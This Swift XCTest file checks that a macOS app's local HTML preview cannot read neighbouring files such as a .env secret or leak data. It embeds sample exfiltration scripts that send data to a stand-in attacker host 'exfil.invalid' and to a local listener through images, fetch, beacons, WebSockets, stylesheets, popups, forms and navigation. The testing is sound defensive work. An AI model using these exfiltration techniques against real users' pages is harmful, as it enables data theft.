import Network
import WebKit
import XCTest
@testable import Threadbear
@testable import ThreadbearCore

/// Daybreak finding 6, in a real web view: a local HTML preview served by
/// the pool's scheme handler can load the style and picture it names, and
/// can't read a file beside it, by fetch, by file URL or by a picture's name.
@MainActor
final class LocalPreviewTests: XCTestCase {
    private var dir: URL!

    override func setUpWithError() throws {
        dir = FileManager.default.temporaryDirectory.appendingPathComponent("LocalPreviewTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: dir)
    }

    private func write(_ name: String, _ data: Data) throws {
        try data.write(to: dir.appendingPathComponent(name))
    }

    /// A 1x1 PNG.
    private let png = Data(base64Encoded: "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")!

    /// A server on this Mac standing in for an attacker's: counts every
    /// connection, so a test can see that nothing reached it.
    private final class Listener: @unchecked Sendable {
        let listener: NWListener
        private let lock = NSLock()
        private var _hits = 0
        private var _requests: [String] = []
        var hits: Int { lock.withLock { _hits } }
        /// Each request's first line, to say which way out was found.
        var requests: [String] { lock.withLock { _requests } }
        var port: UInt16 { listener.port?.rawValue ?? 0 }

        init() throws {
            listener = try NWListener(using: .tcp, on: .any)
            listener.newConnectionHandler = { [weak self] connection in
                self?.lock.withLock { self?._hits += 1 }
                connection.start(queue: .global())
                connection.receive(minimumIncompleteLength: 1, maximumLength: 4096) { data, _, _, _ in
                    let line = data.flatMap { String(data: $0, encoding: .utf8)?.components(separatedBy: "\r\n").first } ?? "(nothing)"
                    self?.lock.withLock { self?._requests.append(line) }
                    connection.send(content: Data("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".utf8), completion: .contentProcessed { _ in connection.cancel() })
                }
            }
        }

        func start() async throws {
            listener.start(queue: .global())
            for _ in 0..<50 where listener.port == nil || listener.state != .ready { try await Task.sleep(for: .milliseconds(20)) }
        }

        deinit { listener.cancel() }
    }

    /// Waits for the preview to finish loading, then runs `body` as the
    /// app's own script in the page (WebKit runs that with the page's
    /// scripts off), standing in for what a page's script or a click would do.
    private func loaded(_ view: WKWebView) async throws {
        for _ in 0..<100 {
            try await Task.sleep(for: .milliseconds(100))
            if view.url?.scheme == LocalPreviewSchemeHandler.scheme, !view.isLoading,
               (try? await view.evaluateJavaScript("document.readyState") as? String) == "complete" { return }
        }
        XCTFail("the page never finished")
    }

    private func run(_ body: String, in view: WKWebView) async throws -> Any? {
        try await view.callAsyncJavaScript(body, contentWorld: .page)
    }

    /// The last verify-fix round: a page's own scripts don't run, so a file
    /// its markup names (`<a href="private.png">`) can be shown but never
    /// read, and the inline script that tries to read it and send it out
    /// does nothing. The ways out are then tried as clicks and as the app's
    /// own script, against a server on this Mac, and none reaches it.
    func testAPreviewsScriptsDontRunAndNothingGetsOut() async throws {
        let server = try Listener()
        try await server.start()
        // Loopback, which skips proxies, so only the rule list, the policy
        // and the link guard stand between the page and this server.
        let host = "127.0.0.1"
        let out = "http://\(host):\(server.port)"
        // And a named host, which goes to the preview's proxy: here a second
        // listener, standing in for the closed port the app uses.
        let sink = try Listener()
        try await sink.start()
        let named = "http://exfil.invalid:\(server.port)"
        // Sanity: the server answers outside the preview.
        let (_, response) = try await URLSession.shared.data(from: URL(string: out + "/ping")!)
        XCTAssertEqual((response as? HTTPURLResponse)?.statusCode, 200)
        try await Task.sleep(for: .milliseconds(100))
        let before = server.hits
        XCTAssertGreaterThan(before, 0)

        try write("private.html", Data("<p>the secret</p>".utf8))
        try write("private.png", png)
        try write("index.html", Data("""
        <!doctype html><html><head><title>preview</title></head><body>
        <iframe src="private.html" id="f"></iframe>
        <a href="private.png">picture</a>
        <a id="away" href="\(out)/clicked">away</a>
        <a id="far" href="\(named)/clicked">far</a>
        <form id="form" method="post" action="\(out)/form"><input name="d" value="x"></form>
        <script>
        document.title = 'script ran';
        fetch('private.png').then(r => r.arrayBuffer()).then(b => {
          new Image().src = '\(out)/img?d=' + b.byteLength;
          fetch('\(out)/fetch?d=' + b.byteLength, { mode: 'no-cors' });
          location.href = '\(out)/location?d=' + b.byteLength;
        });
        </script></body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        pool.previewProxy = .hostPort(host: "127.0.0.1", port: NWEndpoint.Port(rawValue: sink.port)!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        try await loaded(view)
        // The page's own script never ran.
        let title = try await view.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(title, "preview")
        // The page beside it isn't served, even framed.
        let framed = try? await view.evaluateJavaScript("document.getElementById('f').contentDocument?.body?.innerText ?? 'none'") as? String
        XCTAssertFalse((framed ?? "").contains("the secret"))
        let rtc = try await view.evaluateJavaScript("typeof RTCPeerConnection") as? String
        XCTAssertEqual(rtc, "undefined", "WebRTC goes round the proxy")
        // Were a script to run anyway, none of its ways out work.
        let fetched = try await run("""
        const d = 'x';
        new Image().src = '\(out)/img?d=' + d;
        new Image().src = '\(named)/img?d=' + d;
        try { navigator.sendBeacon('\(out)/beacon', d); } catch (e) {}
        try { new WebSocket('ws://\(host):\(server.port)/ws'); } catch (e) {}
        const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '\(out)/css?d=' + d; document.head.appendChild(link);
        try { window.open('\(out)/popup?d=' + d); } catch (e) {}
        try { await fetch('\(named)/fetch?d=' + d, { mode: 'no-cors' }); } catch (e) {}
        try { await fetch('\(out)/fetch?d=' + d, { mode: 'no-cors' }); return 'sent'; } catch (e) { return 'blocked'; }
        """, in: view) as? String
        XCTAssertEqual(fetched, "blocked")
        // And clicks on its links, its form, and a location change.
        _ = try await run("document.getElementById('far').click()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try await run("document.getElementById('away').click()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("document.getElementById('form').submit()", in: view)
        try await Task.sleep(for: .milliseconds(500))
        _ = try? await run("location.href = '\(out)/location'", in: view)
        try await Task.sleep(for: .seconds(2))
        // Nothing reached the server, and the page is still the preview.
        XCTAssertEqual(server.hits, before, "a request got out of the preview: \(server.requests)")
        // At most a bare CONNECT reached the proxy (a closed port in the app),
        // never a request with the page's data in it.
        XCTAssertTrue(sink.requests.allSatisfy { $0.hasPrefix("CONNECT ") }, "\(sink.requests)")
        XCTAssertEqual(view.url?.scheme, LocalPreviewSchemeHandler.scheme)
        XCTAssertEqual(view.url?.lastPathComponent, "index.html")
    }

    /// A page still shows its own style and picture, with its scripts off,
    /// and the files beside it it doesn't name aren't served.
    func testAPreviewShowsItsStyleAndPicture() async throws {
        try write("style.css", Data("body { color: rgb(1, 2, 3); }".utf8))
        try write("pic.png", png)
        try write("secret.png", png)
        try write(".env", Data("SECRET=hunter2".utf8))
        try write("notes.txt", Data("private".utf8))
        try write("index.html", Data("""
        <!doctype html><html><head><title>preview</title><link rel="stylesheet" href="style.css"></head><body>
        <img id="pic" src="pic.png"><script>document.title = 'script ran';</script>
        </body></html>
        """.utf8))

        let pool = WebPanelPool(defaults: UserDefaults(suiteName: "LocalPreviewTests.\(UUID().uuidString)")!)
        let view = pool.webView(for: dir.appendingPathComponent("index.html"))
        try await loaded(view)
        let color = try await view.evaluateJavaScript("getComputedStyle(document.body).color") as? String
        let width = try await view.evaluateJavaScript("document.getElementById('pic').naturalWidth") as? NSNumber
        let title = try await view.evaluateJavaScript("document.title") as? String
        XCTAssertEqual(color, "rgb(1, 2, 3)")
        XCTAssertEqual(width?.intValue, 1)
        XCTAssertEqual(title, "preview", "the page's script ran")
        let refused = try await run("""
        async function tryRead(path) {
          try { const r = await fetch(path); return r.ok ? 'read:' + (await r.text()) : 'refused:' + r.status; }
          catch (e) { return 'refused:error'; }
        }
        return [await tryRead('.env'), await tryRead('notes.txt'), await tryRead('secret.png'), await tryRead('../x.png'),
                await tryRead('file://' + \(String(reflecting: dir.path)) + '/.env')];
        """, in: view) as? [String]
        XCTAssertEqual(refused?.count, 5)
        XCTAssertTrue(refused?.allSatisfy { $0.hasPrefix("refused") } ?? false, "\(refused ?? [])")
    }
}
